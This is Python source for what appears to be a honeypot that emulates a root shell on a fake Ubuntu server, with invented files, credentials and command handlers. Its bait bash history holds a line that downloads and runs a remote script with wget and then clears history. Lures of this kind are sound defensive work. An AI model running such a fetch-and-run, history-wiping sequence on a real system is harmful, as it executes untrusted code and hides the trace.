import posixpath
import re
import random
import hashlib

HOSTNAME = "ubuntu-server"
USERNAME = "root"

# ── Fake filesystem ───────────────────────────────────────────────────────────
FAKE_FS = {
    "/": ["bin", "boot", "dev", "etc", "home", "lib", "lib64", "media",
          "mnt", "opt", "proc", "root", "run", "sbin", "srv", "sys",
          "tmp", "usr", "var"],
    "/etc": ["passwd", "shadow", "group", "hosts", "hostname", "os-release",
             "crontab", "cron.d", "cron.daily", "ssh", "ssl", "apt",
             "systemd", "network", "resolv.conf", "fstab", "motd",
             "issue", "bash.bashrc", "profile", "sudoers", "ld.so.conf"],
    "/etc/ssh": ["sshd_config", "ssh_config", "ssh_host_rsa_key",
                 "ssh_host_ecdsa_key", "authorized_keys"],
    "/etc/cron.d": ["anacron", "sysstat"],
    "/root": [".bashrc", ".bash_history", ".ssh", ".profile",
              ".wget-hsts", "readme.txt"],
    "/root/.ssh": ["authorized_keys", "known_hosts", "id_rsa", "id_rsa.pub"],
    "/tmp": [],
    "/var": ["log", "www", "run", "spool", "mail", "cache", "lib"],
    "/var/log": ["auth.log", "syslog", "kern.log", "dpkg.log",
                 "apt", "nginx", "mysql"],
    "/var/www": ["html"],
    "/var/www/html": ["index.html", "wp-config.php", ".htaccess"],
    "/home": ["ubuntu", "deploy", "backup"],
    "/home/ubuntu": [".bashrc", ".profile", ".ssh", "backup.sh"],
    "/home/ubuntu/.ssh": ["authorized_keys"],
    "/home/deploy": [".bashrc", ".profile", "app"],
    "/home/backup": [".bashrc", "backup.tar.gz"],
    "/proc": ["cpuinfo", "meminfo", "version", "net", "sys",
              "self", "1", "423", "1337"],
    "/proc/net": ["tcp", "udp", "if_inet6", "arp"],
    "/bin": ["bash", "sh", "ls", "cat", "grep", "find", "ps",
             "netstat", "cp", "mv", "rm", "mkdir", "chmod",
             "chown", "echo", "ping", "kill", "df", "mount"],
    "/sbin": ["ifconfig", "ip", "iptables", "route", "reboot",
              "shutdown", "modprobe", "fdisk", "useradd",
              "userdel", "usermod", "groupadd"],
    "/usr": ["bin", "sbin", "lib", "local", "share"],
    "/usr/bin": ["python3", "python", "perl", "ruby", "curl", "wget",
                 "nc", "ncat", "nmap", "ssh", "scp", "git", "gcc",
                 "make", "vim", "nano", "top", "htop", "id", "whoami",
                 "uname", "uptime", "w", "last", "lastlog", "crontab",
                 "base64", "xxd", "strings", "file", "lsof", "strace",
                 "tcpdump", "socat", "screen", "tmux", "unzip", "tar"],
    "/usr/local": ["bin", "lib", "share"],
    "/usr/local/bin": ["pip", "pip3", "node", "npm"],
    "/opt": ["app", "backup", "scripts"],
    "/opt/scripts": ["backup.sh", "monitor.sh", "cleanup.sh"],
}

# ── Fake file contents ────────────────────────────────────────────────────────
FAKE_FILES = {
    "/etc/passwd": (
        "root:x:0:0:root:/root:/bin/bash\n"
        "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
        "bin:x:2:2:bin:/bin:/usr/sbin/nologin\n"
        "sys:x:3:3:sys:/dev:/usr/sbin/nologin\n"
        "sync:x:4:65534:sync:/bin:/bin/sync\n"
        "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n"
        "backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n"
        "nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n"
        "ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash\n"
        "deploy:x:1001:1001:Deploy User:/home/deploy:/bin/bash\n"
        "mysql:x:112:117:MySQL Server:/nonexistent:/bin/false\n"
    ),
    "/etc/shadow": (
        "root:$6$rounds=656000$saltsaltsalt$hashedpassword1:19000:0:99999:7:::\n"
        "daemon:*:19000:0:99999:7:::\n"
        "ubuntu:$6$rounds=656000$usersaltsalt$hashedpassword2:19000:0:99999:7:::\n"
        "deploy:$6$rounds=656000$deploysalt$hashedpassword3:19000:0:99999:7:::\n"
        "mysql:!:19000:0:99999:7:::\n"
    ),
    "/etc/group": (
        "root:x:0:\n"
        "sudo:x:27:ubuntu\n"
        "www-data:x:33:\n"
        "ubuntu:x:1000:\n"
        "docker:x:999:ubuntu,deploy\n"
    ),
    "/etc/hosts": (
        "127.0.0.1 localhost\n"
        "127.0.1.1 ubuntu-server\n"
        "10.0.2.1 gateway\n"
        "10.0.2.15 ubuntu-server\n"
        "::1 localhost ip6-localhost ip6-loopback\n"
    ),
    "/etc/hostname": "ubuntu-server\n",
    "/etc/resolv.conf": (
        "nameserver 8.8.8.8\n"
        "nameserver 8.8.4.4\n"
        "search ec2.internal\n"
    ),
    "/etc/os-release": (
        'NAME="Ubuntu"\n'
        'VERSION="22.04.3 LTS (Jammy Jellyfish)"\n'
        'ID=ubuntu\n'
        'ID_LIKE=debian\n'
        'PRETTY_NAME="Ubuntu 22.04.3 LTS"\n'
        'VERSION_ID="22.04"\n'
        'HOME_URL="https://www.ubuntu.com/"\n'
    ),
    "/etc/crontab": (
        "# /etc/crontab: system-wide crontab\n"
        "SHELL=/bin/sh\n"
        "PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n"
        "17 * * * * root cd / && run-parts --report /etc/cron.hourly\n"
        "25 6 * * * root test -x /usr/sbin/anacron || run-parts --report /etc/cron.daily\n"
        "47 6 * * 7 root test -x /usr/sbin/anacron || run-parts --report /etc/cron.weekly\n"
    ),
    "/etc/ssh/sshd_config": (
        "Port 22\n"
        "Protocol 2\n"
        "HostKey /etc/ssh/ssh_host_rsa_key\n"
        "PermitRootLogin yes\n"
        "PasswordAuthentication yes\n"
        "PubkeyAuthentication yes\n"
        "AuthorizedKeysFile .ssh/authorized_keys\n"
        "X11Forwarding yes\n"
        "PrintMotd no\n"
        "AcceptEnv LANG LC_*\n"
        "Subsystem sftp /usr/lib/openssh/sftp-server\n"
    ),
    "/etc/sudoers": (
        "# This file MUST be edited with the 'visudo' command\n"
        "Defaults env_reset\n"
        "Defaults mail_badpass\n"
        "root ALL=(ALL:ALL) ALL\n"
        "%admin ALL=(ALL) ALL\n"
        "%sudo ALL=(ALL:ALL) ALL\n"
        "ubuntu ALL=(ALL) NOPASSWD:ALL\n"
    ),
    "/etc/fstab": (
        "# <file system> <mount point> <type> <options> <dump> <pass>\n"
        "UUID=abc123 / ext4 errors=remount-ro 0 1\n"
        "/dev/sdb1 /data ext4 defaults 0 2\n"
        "tmpfs /tmp tmpfs defaults,noexec,nosuid 0 0\n"
    ),
    "/etc/motd": (
        "\n"
        "Welcome to Ubuntu 22.04.3 LTS\n\n"
        " * Documentation: https://help.ubuntu.com\n"
        " * Management:    https://landscape.canonical.com\n"
        " * Support:       https://ubuntu.com/advantage\n\n"
        "0 updates can be applied immediately.\n\n"
    ),
    "/root/.bashrc": (
        "# ~/.bashrc: executed by bash(1) for non-login shells.\n"
        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n"
        "export HISTSIZE=1000\n"
        "export HISTFILESIZE=2000\n"
        "alias ll='ls -alF'\n"
        "alias la='ls -A'\n"
        "alias l='ls -CF'\n"
        "PS1='\\u@\\h:\\w\\$ '\n"
    ),
    "/root/.bash_history": (
        "ls -la\n"
        "cd /var/www/html\n"
        "cat /etc/passwd\n"
        "ps aux\n"
        "netstat -tulpn\n"
        "cd /tmp\n"
        "wget http://update-server.com/patch.sh\n"
        "chmod +x patch.sh\n"
        "./patch.sh\n"
        "history -c\n"
    ),
    "/root/.ssh/authorized_keys": (
        "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3 admin@management\n"
    ),
    "/root/.ssh/id_rsa": (
        "-----BEGIN RSA PRIVATE KEY-----\n"
        "MIIEowIBAAKCAQEA2a2rwplBQLzHPZe5RJrEMnRr\n"
        "vHPMNjGELJZiBtRauIRQ5v7xMSbCqBtEGBSoEP78\n"
        "...TRUNCATED...\n"
        "-----END RSA PRIVATE KEY-----\n"
    ),
    "/root/.ssh/id_rsa.pub": (
        "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3 root@ubuntu-server\n"
    ),
    "/root/readme.txt": (
        "Internal production server\n"
        "Do NOT distribute credentials or access keys.\n"
        "Contact: admin@company.com\n"
        "Last updated: 2024-01-15\n"
    ),
    "/root/.profile": (
        "# ~/.profile: executed by Bourne-compatible login shells.\n"
        "if [ -f ~/.bashrc ]; then . ~/.bashrc; fi\n"
    ),
    "/var/www/html/wp-config.php": (
        "<?php\n"
        "define('DB_NAME', 'wordpress');\n"
        "define('DB_USER', 'wpuser');\n"
        "define('DB_PASSWORD', 'Str0ng!Pass#2024');\n"
        "define('DB_HOST', 'localhost');\n"
        "define('AUTH_KEY', 'put your unique phrase here');\n"
        "define('SECURE_AUTH_KEY', 'put your unique phrase here');\n"
        "?>\n"
    ),
    "/var/www/html/index.html": (
        "<html><body><h1>Apache2 Ubuntu Default Page</h1>"
        "<p>It works!</p></body></html>\n"
    ),
    "/home/ubuntu/.ssh/authorized_keys": (
        "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3 ubuntu@workstation\n"
    ),
    "/home/backup/backup.tar.gz": "[binary data — 47MB]\n",
    "/opt/scripts/backup.sh": (
        "#!/bin/bash\n"
        "# Backup script\n"
        "DEST=/home/backup\n"
        "tar -czf $DEST/backup.tar.gz /var/www/html /etc\n"
        "echo 'Backup completed' >> /var/log/backup.log\n"
    ),
    "/proc/version": (
        "Linux version 5.15.0-91-generic "
        "(buildd@lcy02-amd64-032) "
        "(gcc version 11.4.0 (Ubuntu 11.4.0-1ubuntu1~22.04)) "
        "#101-Ubuntu SMP Tue Nov 14 13:30:08 UTC 2023\n"
    ),
    "/proc/cpuinfo": (
        "processor\t: 0\n"
        "vendor_id\t: GenuineIntel\n"
        "cpu family\t: 6\n"
        "model name\t: Intel(R) Xeon(R) CPU E5-2686 v4 @ 2.30GHz\n"
        "cpu MHz\t\t: 2300.000\n"
        "cache size\t: 46080 KB\n"
        "cpu cores\t: 2\n"
        "flags\t\t: fpu vme de pse tsc msr pae mce cx8 apic\n"
        "\n"
        "processor\t: 1\n"
        "vendor_id\t: GenuineIntel\n"
        "cpu family\t: 6\n"
        "model name\t: Intel(R) Xeon(R) CPU E5-2686 v4 @ 2.30GHz\n"
        "cpu MHz\t\t: 2300.000\n"
        "cache size\t: 46080 KB\n"
        "cpu cores\t: 2\n"
    ),
    "/proc/meminfo": (
        "MemTotal:        8014688 kB\n"
        "MemFree:          234560 kB\n"
        "MemAvailable:    4567890 kB\n"
        "Buffers:          234567 kB\n"
        "Cached:          2345678 kB\n"
        "SwapTotal:       2097148 kB\n"
        "SwapFree:        2097148 kB\n"
    ),
    "/proc/net/tcp": (
        "  sl  local_address rem_address   st tx_queue rx_queue\n"
        "   0: 00000000:0016 00000000:0000 0A 00000000:00000000\n"
        "   1: 00000000:0050 00000000:0000 0A 00000000:00000000\n"
        "   2: 0F02000A:0016 0202000A:D6E4 01 00000000:00000000\n"
    ),
    "/var/log/auth.log": (
        "Jan 15 09:12:01 ubuntu-server sshd[1337]: "
        "Failed password for root from 192.168.1.100 port 54321 ssh2\n"
        "Jan 15 09:12:03 ubuntu-server sshd[1337]: "
        "Failed password for root from 192.168.1.100 port 54321 ssh2\n"
        "Jan 15 09:12:05 ubuntu-server sshd[1338]: "
        "Accepted password for root from 192.168.1.100 port 54322 ssh2\n"
        "Jan 15 09:12:05 ubuntu-server sshd[1338]: "
        "pam_unix(sshd:session): session opened for user root\n"
    ),
    "/var/log/syslog": (
        "Jan 15 09:00:01 ubuntu-server CRON[1234]: "
        "(root) CMD (cd / && run-parts --report /etc/cron.hourly)\n"
        "Jan 15 09:10:01 ubuntu-server systemd[1]: "
        "Started Session 42 of user root.\n"
        "Jan 15 09:12:01 ubuntu-server kernel: "
        "[12345.678901] eth0: renamed from veth1234\n"
    ),
}

# ── Which map ─────────────────────────────────────────────────────────────────
_WHICH_MAP = {
    "bash": "/bin/bash", "sh": "/bin/sh",
    "python3": "/usr/bin/python3", "python": "/usr/bin/python3",
    "perl": "/usr/bin/perl", "ruby": "/usr/bin/ruby",
    "wget": "/usr/bin/wget", "curl": "/usr/bin/curl",
    "nc": "/bin/nc", "ncat": "/usr/bin/ncat", "netcat": "/bin/nc",
    "socat": "/usr/bin/socat",
    "ls": "/bin/ls", "cat": "/bin/cat", "grep": "/bin/grep",
    "find": "/usr/bin/find", "ps": "/bin/ps",
    "netstat": "/bin/netstat", "ss": "/usr/sbin/ss",
    "ifconfig": "/sbin/ifconfig", "ip": "/sbin/ip",
    "iptables": "/sbin/iptables", "nmap": "/usr/bin/nmap",
    "masscan": "/usr/bin/masscan",
    "whoami": "/usr/bin/whoami", "id": "/usr/bin/id",
    "uname": "/bin/uname", "hostname": "/bin/hostname",
    "uptime": "/usr/bin/uptime", "pwd": "/bin/pwd",
    "echo": "/bin/echo", "env": "/usr/bin/env",
    "crontab": "/usr/bin/crontab", "chmod": "/bin/chmod",
    "chown": "/bin/chown", "mkdir": "/bin/mkdir",
    "touch": "/usr/bin/touch", "rm": "/bin/rm",
    "df": "/bin/df", "free": "/usr/bin/free",
    "base64": "/usr/bin/base64", "xxd": "/usr/bin/xxd",
    "strings": "/usr/bin/strings", "file": "/usr/bin/file",
    "gcc": "/usr/bin/gcc", "make": "/usr/bin/make",
    "git": "/usr/bin/git", "tar": "/bin/tar",
    "unzip": "/usr/bin/unzip", "gzip": "/bin/gzip",
    "lsof": "/usr/bin/lsof", "strace": "/usr/bin/strace",
    "tcpdump": "/usr/sbin/tcpdump",
    "useradd": "/usr/sbin/useradd", "userdel": "/usr/sbin/userdel",
    "usermod": "/usr/sbin/usermod", "passwd": "/usr/bin/passwd",
    "last": "/usr/bin/last", "lastlog": "/usr/bin/lastlog",
    "w": "/usr/bin/w", "who": "/usr/bin/who",
    "top": "/usr/bin/top", "htop": "/usr/bin/htop",
    "screen": "/usr/bin/screen", "tmux": "/usr/bin/tmux",
    "vim": "/usr/bin/vim", "nano": "/bin/nano",
    "ssh": "/usr/bin/ssh", "scp": "/usr/bin/scp",
    "su": "/bin/su", "sudo": "/usr/bin/sudo",
    "kill": "/bin/kill", "killall": "/usr/bin/killall",
    "pkill": "/usr/bin/pkill",
    "mount": "/bin/mount", "umount": "/bin/umount",
    "fdisk": "/sbin/fdisk", "lsblk": "/bin/lsblk",
    "systemctl": "/bin/systemctl", "service": "/usr/sbin/service",
    "journalctl": "/bin/journalctl",
    "apt": "/usr/bin/apt", "apt-get": "/usr/bin/apt-get",
    "dpkg": "/usr/bin/dpkg", "yum": "/usr/bin/yum",
    "pip": "/usr/local/bin/pip", "pip3": "/usr/local/bin/pip3",
    "ping": "/bin/ping", "traceroute": "/usr/bin/traceroute",
    "dig": "/usr/bin/dig", "nslookup": "/usr/bin/nslookup",
    "route": "/sbin/route",
}

UNAME_FULL = (
    "Linux ubuntu-server 5.15.0-91-generic "
    "#101-Ubuntu SMP Tue Nov 14 13:30:08 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux"
)
UPTIME_STR = (
    " 14:32:01 up 47 days,  3:12,  1 user,  "
    "load average: 0.08, 0.03, 0.01"
)


class ShellSession:
    def __init__(self):
        self.cwd = "/root"
        self.history: list[str] = []
        self.tmp_files: dict[str, str] = {}
        self.tmp_dirs: set[str] = set()
        self.exited: bool = False
        self.env: dict[str, str] = {
            "HOME": "/root",
            "USER": "root",
            "LOGNAME": "root",
            "SHELL": "/bin/bash",
            "PATH": ("/usr/local/sbin:/usr/local/bin:/usr/sbin:"
                     "/usr/bin:/sbin:/bin"),
            "TERM": "xterm-256color",
            "LANG": "en_US.UTF-8",
            "PWD": "/root",
            "MAIL": "/var/mail/root",
            "EDITOR": "vim",
        }

    def all_files(self) -> dict[str, str]:
        return {**FAKE_FILES, **self.tmp_files}

    def resolve_path(self, path: str) -> str:
        if path == "~":
            return "/root"
        if not path.startswith("/"):
            path = self.cwd + "/" + path
        return posixpath.normpath(path)

    def is_dir(self, path: str) -> bool:
        return path in FAKE_FS or path in self.tmp_dirs

    def fs_contents(self, path: str) -> list[str] | None:
        if path in FAKE_FS or path in self.tmp_dirs:
            base = list(FAKE_FS.get(path, []))
            file_children = [
                p[len(path):].lstrip("/").split("/")[0]
                for p in self.tmp_files
                if p.startswith(path + "/")
            ]
            dir_children = [
                p[len(path):].lstrip("/").split("/")[0]
                for p in self.tmp_dirs
                if p.startswith(path + "/")
            ]
            return list(dict.fromkeys(base + file_children + dir_children))
        return None


def get_prompt(session: "ShellSession") -> str:
    display = "~" if session.cwd == "/root" else session.cwd
    return f"{USERNAME}@{HOSTNAME}:{display}# "


def _expand_vars(text: str, session: ShellSession) -> str:
    for k, v in session.env.items():
        text = text.replace(f"${k}", v).replace(f"${{{k}}}", v)
    return text


def _handle_redirect(parts: list[str], session: ShellSession):
    for op in (">>", ">"):
        if op in parts:
            idx = parts.index(op)
            write_path = parts[idx + 1] if idx + 1 < len(parts) else None
            if write_path:
                write_path = session.resolve_path(write_path)
            return parts[:idx], write_path, op == ">>"
    return parts, None, False


def handle_command(raw: str, session: ShellSession) -> str:
    raw = raw.strip()
    if not raw or raw.startswith("#"):
        return ""

    # handle semicolon-separated commands
    if ";" in raw and not raw.startswith("for"):
        results = []
        for cmd in raw.split(";"):
            r = handle_command(cmd.strip(), session)
            if r:
                results.append(r)
        return "\n".join(results)

    # handle pipe — run left side, discard right
    if "|" in raw:
        left = raw.split("|")[0].strip()
        right = raw.split("|", 1)[1].strip()
        left_out = handle_command(left, session)
        # handle grep on left output
        if right.startswith("grep"):
            grep_parts = right.split()
            pattern = grep_parts[1] if len(grep_parts) > 1 else ""
            if pattern:
                lines = [l for l in left_out.splitlines() if pattern in l]
                return "\n".join(lines)
        if right.startswith("wc -l"):
            return str(len(left_out.splitlines()))
        if right.startswith("head"):
            n = 10
            hp = right.split()
            if "-n" in hp:
                try:
                    n = int(hp[hp.index("-n") + 1])
                except Exception:
                    pass
            return "\n".join(left_out.splitlines()[:n])
        if right.startswith("tail"):
            n = 10
            tp = right.split()
            if "-n" in tp:
                try:
                    n = int(tp[tp.index("-n") + 1])
                except Exception:
                    pass
            return "\n".join(left_out.splitlines()[-n:])
        if right.startswith("sort"):
            lines = left_out.splitlines()
            return "\n".join(sorted(lines))
        if right.startswith("uniq"):
            lines = left_out.splitlines()
            seen = []
            for l in lines:
                if not seen or l != seen[-1]:
                    seen.append(l)
            return "\n".join(seen)
        return left_out

    parts = raw.split()
    parts, redirect_path, append_mode = _handle_redirect(parts, session)
    if not parts:
        return ""

    base = parts[0]
    session.history.append(raw)
    session.env["PWD"] = session.cwd

    def _write_redirect(content: str):
        if redirect_path:
            existing = session.tmp_files.get(redirect_path, "")
            session.tmp_files[redirect_path] = (
                existing + content + "\n" if append_mode
                else content + "\n"
            )
            parent = posixpath.dirname(redirect_path)
            fname = posixpath.basename(redirect_path)
            if parent in FAKE_FS and fname not in FAKE_FS[parent]:
                FAKE_FS[parent] = list(FAKE_FS[parent]) + [fname]
            return ""
        return content

    # ── session control ───────────────────────────────────────────────────────
    if base in ("exit", "logout", "quit"):
        session.exited = True
        return "logout"

    if base in ("bash", "sh", "rbash", "dash"):
        return ""

    if base == "clear":
        return "\x1b[2J\x1b[H"

    if base == "reset":
        return "\x1bc"

    # ── identity / user info ──────────────────────────────────────────────────
    if base == "whoami":
        return _write_redirect(USERNAME)

    if base == "id":
        return _write_redirect(
            "uid=0(root) gid=0(root) "
            "groups=0(root),4(adm),24(cdrom),27(sudo),30(dip)"
        )

    if base == "w":
        return _write_redirect(
            f"{UPTIME_STR}\n"
            "USER     TTY      FROM             LOGIN@   IDLE JCPU   PCPU WHAT\n"
            "root     pts/0    10.0.2.2         09:12    0.00s  0.04s  0.00s w"
        )

    if base == "who":
        return _write_redirect(
            "root     pts/0        2024-01-15 09:12 (10.0.2.2)"
        )

    if base == "last":
        return _write_redirect(
            "root     pts/0        10.0.2.2         Mon Jan 15 09:12   "
            "still logged in\n"
            "root     pts/0        10.0.2.2         Sun Jan 14 22:45 - "
            "23:01  (00:15)\n"
            "reboot   system boot  5.15.0-91-generi Sun Jan 14 22:44   "
            "still running\n\n"
            "wtmp begins Sun Nov 26 14:32:01 2023"
        )

    if base == "lastlog":
        return _write_redirect(
            "Username         Port     From             Latest\n"
            "root             pts/0    10.0.2.2         Mon Jan 15 09:12:01 "
            "+0000 2024\n"
            "ubuntu           pts/1    192.168.1.50     Fri Jan 12 14:22:11 "
            "+0000 2024\n"
            "deploy           pts/2    10.0.1.100       Thu Jan 11 08:15:33 "
            "+0000 2024\n"
        )

    # ── system info ───────────────────────────────────────────────────────────
    if base == "uname":
        if "-a" in parts:
            return _write_redirect(UNAME_FULL)
        if "-r" in parts:
            return _write_redirect("5.15.0-91-generic")
        if "-n" in parts:
            return _write_redirect(HOSTNAME)
        if "-m" in parts:
            return _write_redirect("x86_64")
        if "-s" in parts:
            return _write_redirect("Linux")
        if "-v" in parts:
            return _write_redirect(
                "#101-Ubuntu SMP Tue Nov 14 13:30:08 UTC 2023"
            )
        return _write_redirect("Linux")

    if base == "hostname":
        if "-I" in parts or "-i" in parts:
            return _write_redirect("10.0.2.15 172.17.0.1")
        return _write_redirect(HOSTNAME)

    if base == "uptime":
        return _write_redirect(UPTIME_STR)

    if base == "date":
        return _write_redirect("Mon Jan 15 14:32:01 UTC 2024")

    if base == "lsb_release":
        return _write_redirect(
            "No LSB modules are available.\n"
            "Distributor ID:\tUbuntu\n"
            "Description:\tUbuntu 22.04.3 LTS\n"
            "Release:\t22.04\n"
            "Codename:\tjammy"
        )

    if base == "arch":
        return _write_redirect("x86_64")

    # ── environment ───────────────────────────────────────────────────────────
    if base in ("env", "printenv"):
        if len(parts) > 1 and base == "printenv":
            return _write_redirect(session.env.get(parts[1], ""))
        return _write_redirect(
            "\n".join(f"{k}={v}" for k, v in session.env.items())
        )

    if base == "echo":
        text = " ".join(parts[1:]) if len(parts) > 1 else ""
        text = _expand_vars(text, session)
        # strip quotes
        text = text.strip("\"'")
        return _write_redirect(text)

    if base == "export":
        if len(parts) > 1 and "=" in parts[1]:
            k, v = parts[1].split("=", 1)
            session.env[k] = v.strip("\"'")
        return _write_redirect("")

    if base == "unset":
        if len(parts) > 1:
            session.env.pop(parts[1], None)
        return _write_redirect("")

    # ── filesystem navigation ─────────────────────────────────────────────────
    if base == "pwd":
        return _write_redirect(session.cwd)

    if base == "cd":
        arg = parts[1] if len(parts) > 1 else "~"
        if arg == "-":
            arg = session.env.get("OLDPWD", "/root")
        target = "/root" if arg == "~" else session.resolve_path(arg)
        if session.is_dir(target):
            session.env["OLDPWD"] = session.cwd
            session.cwd = target
            session.env["PWD"] = target
            return ""
        return f"bash: cd: {arg}: No such file or directory"

    if base == "ls":
        target = session.cwd
        flags = [p for p in parts[1:] if p.startswith("-")]
        args = [p for p in parts[1:] if not p.startswith("-")]
        if args:
            target = session.resolve_path(args[0])
        contents = session.fs_contents(target)
        if contents is None:
            arg_str = args[0] if args else target
            return (
                f"ls: cannot access '{arg_str}': "
                "No such file or directory"
            )
        if not contents:
            return ""
        long = any(
            f in flags for f in ("-l", "-la", "-al", "-lh", "-lah")
        )
        show_hidden = any(f in flags for f in ("-a", "-la", "-al"))
        if not show_hidden:
            contents = [c for c in contents if not c.startswith(".")]
        if long:
            lines = [f"total {4 * max(len(contents), 1)}"]
            for item in contents:
                full = target.rstrip("/") + "/" + item
                is_dir = session.is_dir(full)
                perm = "drwxr-xr-x" if is_dir else "-rw-r--r--"
                if item in (
                    "shadow", "sudoers", "id_rsa", "authorized_keys"
                ):
                    perm = "-rw-------"
                elif item in ("passwd", "hosts", "hostname"):
                    perm = "-rw-r--r--"
                elif item.endswith(".sh"):
                    perm = "-rwxr-xr-x"
                size = "4096" if is_dir else str(
                    len(session.all_files().get(full, "")) or
                    random.randint(512, 8192)
                )
                lines.append(
                    f"{perm} 2 root root {size:>6} Jan 15 09:12 {item}"
                )
            return _write_redirect("\n".join(lines))
        return _write_redirect("  ".join(contents))

    if base in ("dir",):
        return handle_command("ls " + " ".join(parts[1:]), session)

    # ── file operations ───────────────────────────────────────────────────────
    if base == "cat":
        if len(parts) < 2:
            return ""
        results = []
        for arg in parts[1:]:
            if arg.startswith("-"):
                continue
            path = session.resolve_path(arg)
            content = session.all_files().get(path)
            if content is not None:
                results.append(content.rstrip("\n"))
            else:
                results.append(
                    f"cat: {arg}: No such file or directory"
                )
        return _write_redirect("\n".join(results))

    if base in ("head", "tail"):
        if len(parts) < 2:
            return ""
        path = session.resolve_path(parts[-1])
        content = session.all_files().get(path)
        if content is None:
            return (
                f"{base}: cannot open '{parts[-1]}' for reading: "
                "No such file or directory"
            )
        lines = content.splitlines()
        n = 10
        for i, p in enumerate(parts[1:], 1):
            if p == "-n" and i < len(parts) - 1:
                try:
                    n = int(parts[i + 1])
                except ValueError:
                    pass
            elif p.startswith("-n"):
                try:
                    n = int(p[2:])
                except ValueError:
                    pass
        result = lines[:n] if base == "head" else lines[-n:]
        return _write_redirect("\n".join(result))

    if base == "grep":
        flags = [p for p in parts[1:] if p.startswith("-")]
        args = [p for p in parts[1:] if not p.startswith("-")]
        if len(args) < 1:
            return ""
        pattern = args[0]
        if len(args) >= 2:
            path = session.resolve_path(args[1])
            content = session.all_files().get(path, "")
            if "-i" in flags:
                matches = [l for l in content.splitlines() if pattern.lower() in l.lower()]
            else:
                matches = [l for l in content.splitlines() if pattern in l]
            return _write_redirect("\n".join(matches))
        return ""

    if base == "wc":
        if len(parts) < 2:
            return ""
        path = session.resolve_path(parts[-1])
        content = session.all_files().get(path, "")
        lines = len(content.splitlines())
        words = len(content.split())
        chars = len(content)
        if "-l" in parts:
            return _write_redirect(f"{lines} {parts[-1]}")
        if "-w" in parts:
            return _write_redirect(f"{words} {parts[-1]}")
        if "-c" in parts:
            return _write_redirect(f"{chars} {parts[-1]}")
        return _write_redirect(f"{lines} {words} {chars} {parts[-1]}")

    if base == "find":
        start = session.cwd
        args = parts[1:]
        name_filter = None
        type_filter = None
        if args and not args[0].startswith("-"):
            start = session.resolve_path(args[0])
            args = args[1:]
        if "-name" in args:
            idx = args.index("-name")
            if idx + 1 < len(args):
                name_filter = args[idx + 1].strip("*\"'")
        if "-type" in args:
            idx = args.index("-type")
            if idx + 1 < len(args):
                type_filter = args[idx + 1]
        results = []
        for path in list(FAKE_FS.keys()) + list(
            session.tmp_files.keys()
        ):
            if not path.startswith(start):
                continue
            if name_filter and name_filter not in posixpath.basename(path):
                continue
            if type_filter == "f" and path in FAKE_FS:
                continue
            if type_filter == "d" and path not in FAKE_FS:
                continue
            results.append(path)
        return _write_redirect("\n".join(sorted(results)) if results else "")

    if base == "mkdir":
        if len(parts) < 2:
            return "mkdir: missing operand"
        for arg in parts[1:]:
            if arg.startswith("-"):
                continue
            path = session.resolve_path(arg)
            session.tmp_dirs.add(path)
        return ""

    if base == "touch":
        if len(parts) < 2:
            return ""
        for arg in parts[1:]:
            path = session.resolve_path(arg)
            if path not in session.all_files():
                session.tmp_files[path] = ""
        return ""

    if base == "rm":
        if len(parts) < 2:
            return "rm: missing operand"
        for arg in parts[1:]:
            if arg.startswith("-"):
                continue
            path = session.resolve_path(arg)
            if path in session.tmp_files:
                del session.tmp_files[path]
            elif path in FAKE_FILES:
                return (
                    f"rm: cannot remove '{arg}': "
                    "Permission denied"
                )
        return ""

    if base in ("cp", "mv"):
        if len(parts) < 3:
            return f"{base}: missing destination file operand"
        src = session.resolve_path(parts[-2])
        dst = session.resolve_path(parts[-1])
        content = session.all_files().get(src, "")
        session.tmp_files[dst] = content
        if base == "mv" and src in session.tmp_files:
            del session.tmp_files[src]
        return ""

    if base in ("chmod", "chown", "chattr"):
        return ""

    if base == "ln":
        return ""

    if base == "file":
        if len(parts) < 2:
            return ""
        path = session.resolve_path(parts[-1])
        if session.is_dir(path):
            return f"{parts[-1]}: directory"
        content = session.all_files().get(path, "")
        if content.startswith("-----BEGIN"):
            return f"{parts[-1]}: PEM certificate"
        if content.startswith("<?php"):
            return f"{parts[-1]}: PHP script, ASCII text"
        if content.startswith("#!"):
            return f"{parts[-1]}: Bourne-Again shell script, ASCII text executable"
        return f"{parts[-1]}: ASCII text"

    if base == "stat":
        if len(parts) < 2:
            return ""
        path = session.resolve_path(parts[-1])
        return (
            f"  File: {parts[-1]}\n"
            f"  Size: {random.randint(512, 8192)}\t"
            f"Blocks: 8\t IO Block: 4096\t regular file\n"
            f"Device: fd00h/64768d\tInode: {random.randint(100000, 999999)}"
            f"\tLinks: 1\n"
            f"Access: (0644/-rw-r--r--)\tUid: (0/root)\tGid: (0/root)\n"
            f"Access: 2024-01-15 09:12:01.000000000 +0000\n"
            f"Modify: 2024-01-15 09:12:01.000000000 +0000\n"
        )

    if base == "diff":
        return ""

    if base == "sort":
        return ""

    if base == "uniq":
        return ""

    if base == "awk":
        return ""

    if base == "sed":
        return ""

    if base == "xargs":
        return ""

    if base == "tee":
        if len(parts) > 1:
            path = session.resolve_path(parts[-1])
            session.tmp_files[path] = ""
        return ""

    # ── archive / compression ─────────────────────────────────────────────────
    if base == "tar":
        if "-x" in parts or "--extract" in parts:
            return "tar: Exiting with failure status due to previous errors"
        if "-c" in parts or "--create" in parts:
            out = next(
                (p for p in parts if p.endswith(".tar.gz") or
                 p.endswith(".tgz")),
                "archive.tar.gz"
            )
            session.tmp_files[session.resolve_path(out)] = "[binary]"
            return ""
        if "-t" in parts or "--list" in parts:
            return (
                "./\n./etc/\n./etc/passwd\n./var/www/html/\n"
                "./var/www/html/index.html\n./var/www/html/wp-config.php"
            )
        return ""

    if base == "unzip":
        return "Archive:  file.zip\n  inflating: file.txt\n"

    if base == "gzip":
        return ""

    if base in ("gunzip", "zcat"):
        return ""

